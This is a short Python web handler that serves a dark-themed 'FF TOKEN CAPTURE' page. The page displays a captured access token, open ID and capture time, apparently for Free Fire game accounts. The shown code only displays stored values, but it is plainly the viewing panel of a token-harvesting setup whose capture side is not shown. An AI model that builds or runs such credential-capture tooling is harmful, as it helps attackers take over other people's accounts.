import json
import time

tokens = {}

def handler(request):
    data = tokens.get('latest')
    
    if data:
        status = "✅ Token Captured!"
        token_display = data.get('access_token', 'N/A')
        openid_display = data.get('open_id', 'N/A')
        time_display = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(data.get('timestamp', 0)))
    else:
        status = "⏳ Waiting for token..."
        token_display = "Not captured yet"
        openid_display = "Not captured yet"
        time_display = "Waiting..."
    
    html = f"""
    <!DOCTYPE html>
    <html>
    <head><title>FF Token Capture</title>
    <style>
        body {{ font-family: monospace; background: #0a0a0a; color: #00ff00; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }}
        .box {{ background: #1a1a1a; padding: 40px; border-radius: 15px; border: 2px solid #00ff00; max-width: 600px; width: 90%; }}
        h1 {{ text-align: center; color: #00ff00; }}
        .label {{ color: #888; margin-top: 15px; }}
        .value {{ background: #0a0a0a; padding: 12px; border-radius: 8px; border: 1px solid #333; word-break: break-all; }}
        .status {{ text-align: center; padding: 10px; border: 1px solid #00ff00; border-radius: 8px; margin-top: 20px; }}
    </style>
    </head>
    <body>
        <div class="box">
            <h1>💀 FF TOKEN CAPTURE</h1>
            <div class="label">📱 Access Token</div>
            <div class="value">{token_display}</div>
            <div class="label">🆔 Open ID</div>
            <div class="value">{openid_display}</div>
            <div class="label">📅 Timestamp</div>
            <div class="value">{time_display}</div>
            <div class="status">{status}</div>
        </div>
    </body>
    </html>
    """
    
    return {
        "statusCode": 200,
        "headers": {"Content-Type": "text/html"},
        "body": html
    }